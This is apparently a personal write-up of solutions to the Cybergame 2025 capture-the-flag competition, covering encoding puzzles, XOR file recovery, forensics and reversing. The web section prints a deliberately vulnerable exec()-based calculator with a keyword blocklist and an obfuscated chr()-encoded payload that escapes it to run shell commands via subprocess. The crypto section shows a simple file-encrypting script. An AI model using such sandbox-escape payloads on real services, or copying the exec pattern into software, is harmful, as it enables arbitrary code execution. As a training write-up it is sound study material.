# Cybergame 2025

This collection details my solutions to challenges from a 10-week individual-style CTF competition, hosted by Kenya’s Ministry of ICT and Digital Economy in partnership with the Government of Slovakia.

It featured challenges in cryptography, reverse engineering, web exploitation, forensics, OSINT and security processes and governance.

I was 44th on the leaderboard, with 46 points in total.

Since the server is not currently displaying challenge details, I’ll have to give vague descriptions of the challenges. Enjoy!


## Misc

### First contact- with the jellyfish

This simply involving clicking the link provided and examining the html file.

![In competition with the jellyfish](/cybergame-2025/Screenshot_at_2025_04_25_21_10_18.png)

The rest of the miscellanous challenges are self-explanatory as shown on the below series of images


An onion of base64 encoded text:

![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_26_43.png)

![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_27_03.png)

![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_27_15.png)

![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_27_26.png)

![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_27_38.png)

Hex encoding:

![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_28_17.png)

Binary encoding:

![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_28_56.png)

Roman numeral encoding
![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_32_31.png)

For this one, I just cleared out all non-alphanumeric values and placed them inside `SK-CERT{}` 

![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_42_14.png)

Simple ROT13 cipher:
![alt text](/cybergame-2025/Screenshot_at_2025_05_02_12_25_47.png)

## Crypto

### Ransomware recovery

#### Part 1

This involved me recovering encrypted files. This was somewhat easy since it involved XOR encryption, even though no key was provided, it was easily traceable since one of the encrypted files was a png image.

![Challenge description](/cybergame-2025/Screenshot_at_2025_05_15_13_13_59.png)

This was the python encrypt file:
```python
import os
from itertools import cycle


TARGET_DIR = "./files/"

def encrypt(filename, key):
    orig_bytes = None
    encrypted_bytes = bytearray()
    with open(TARGET_DIR + filename, "rb") as f:
        orig_bytes = bytearray(f.read() )
    encrypted_bytes = bytes(a ^ b for a, b in zip(orig_bytes, cycle(key)))

    with open(TARGET_DIR + filename, "wb") as f:
        f.write(encrypted_bytes)

    os.rename(TARGET_DIR + filename, TARGET_DIR + filename + ".enc")

    print(f"[+] Encrypted {TARGET_DIR + filename}")


if __name__=="__main__":
    key = os.urandom(16)
    for subdir, dirs, files in os.walk(TARGET_DIR):
        for file in files:
            print(f"file name: {file}")
            encrypt(file, key)

```


A PNG's image first 8 bytes are: `89 50 4E 47 0D 0A 1A 0A`, therefore I easily found the XOR key since `A xor key = C` thus `A xor C = key`.

The decryption script:
```python
from itertools import cycle
import re

# File paths
png_enc_path = "files/slon.png.enc"
txt_enc_path = "files/inescapable_storyception_of_doom.txt.enc"
output_path = "recovered_script.txt"

# Known PNG header bytes (16 bytes)
known_png_header = bytes([
    0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A,
    0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52
])

# Step 1: Extract the XOR key from PNG file
with open(png_enc_path, "rb") as f:
    enc_bytes = f.read(16)

key = bytes([a ^ b for a, b in zip(enc_bytes, known_png_header)])
print(f"[+] Recovered key: {key.hex()}")

# Step 2: Decrypt the encrypted text file
with open(txt_enc_path, "rb") as f:
    encrypted_data = f.read()

decrypted_data = bytes([a ^ b for a, b in zip(encrypted_data, cycle(key))])

with open(output_path, "wb") as f:
    f.write(decrypted_data)

print(f"[+] Decrypted file saved as: {output_path}")

# Step 3: Search for the flag
matches = re.findall(rb'SK-?CERT{[^}]+}', decrypted_data)
if matches:
    print(f"[✓] Flag found: {matches[0].decode()}")
else:
    print("[!] Flag not found. You may want to inspect the output manually.")

```

![alt text](/cybergame-2025/Screenshot_at_2025_05_15_13_13_40.png)


## Web

### JAILLE - Breaking calculator

The objective was relatively easy however delivery was mind jarring. It involved jailbreaking the calculator and simply accessing the filesystem and getting the flag.

The program code itself:
```python
import socket
import os
import pty
import sys

def handle_client(conn):
    s_fd = conn.fileno()
    os.dup2(s_fd, 0)
    os.dup2(s_fd, 1)
    os.dup2(s_fd, 2)
    data = b""
    while True:
        chunk = conn.recv(4096)
        if not chunk:
            break
        data += chunk
        if b'\n' in data:
            break
    text = data.decode().strip()

    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    # Check for forbidden characters.
    for character in ['\'', '\"']:
        if character in text.lower():
            conn.sendall(b"Not allowed, killing\n")
            return

    try:
        exec('print(' + text + ')')
    except Exception as e:
        conn.sendall(("Error: " + str(e) + "\n").encode())

def main():
    host = '0.0.0.0'
    port = 1337
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(f"Listening on {host}:{port}")
        conn, addr = s.accept()  # Handle one connection.
        with conn:
            print(f"Connection from {addr}")
            handle_client(conn)
    sys.exit(0)

if __name__ == "__main__":
    main()
```

This is somehow difficult since the calculator blocks some keywords such as `cat` or `ls` therefore obfuscation is necessary.

Payload used:

```
getattr(__builtins__, chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95))(chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)).check_output([chr(99)+chr(97)+chr(116), chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)], shell=True)
```

Breaking it down:

```
chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)
= "__import__"

chr(117)+chr(98)+chr(112)+chr(114)+chr(111)+chr(99)+chr(101)+chr(115)+chr(115)
= "subprocess"

chr(99)+chr(97)+chr(116)
= "cat"

chr(102)+chr(108)+chr(97)+chr(103)+chr(46)+chr(116)+chr(120)+chr(116)
= "flag.txt"
```
The resolved version:

```
__import__('subprocess').check_output(['cat', 'flag.txt'], shell=True)
```

Got the flag: `SK-CERT{35c3p1ng_py7h0n_15_345Y_745k}`

![alt text](/cybergame-2025/Screenshot_at_2025_05_14_19_45_08.png)


## Forensics

### Part 1

This was very easy.

All it involved was downloading a file `part1.txt` and viewing its contents using cat (don't worry about my cat, i use `bat`; a better version of cat)

On viewing it, we get the flag

![part1.txt flag](/cybergame-2025/Screenshot_at_2025_04_25_21_09_29.png)

### Eugene's Flag

This whole series involved a disk image file from which one is to recover deleted files and perform forensics on them.

I used foremost on the dd image however this series was somehow difficult since i would try out a level 3 flag on the level 1 answer slot.

![Challenge description](/cybergame-2025/Screenshot_at_2025_05_01_17_04_55.png)


#### Part 1

On checking the `/mnt` directory, the flag exists but it is encoded using Caeser's cipher ROT13. Heading onto cyberchef for decryption, we get the flag.

![decoded flag](/cybergame-2025/Screenshot_at_2025_05_01_17_05_01.png)

![challenge description](/cybergame-2025/Screenshot_at_2025_05_01_17_06_40.png)

#### Part 2


This involved viewing a file named `file` which was part ASCII based text and the rest binary. On viewing it, the flag is revealed

![Flag reveal!](/cybergame-2025/Screenshot_at_2025_05_01_16_28_41.png)

#### Part 3

On recovering files from the image file, three folders resurrect: `pdf`, `jpg` and `zip`. The third flag was hidden after performing `strings` analysis on the pdf inside the `pdf` folder. The string itself was base64 encoded.

![flag found](/cybergame-2025/Screenshot_at_2025_05_13_23_43_03.png)

## Rev

#### Sanity Checker

This involved running a binary file. On running it, it outputs a bash script.

Inside the bash script, the flag exists as a comment. The second flag which is base64 encrypted ,is echoed out.

![alt text](/cybergame-2025/Screenshot_at_2025_05_15_16_45_07.png)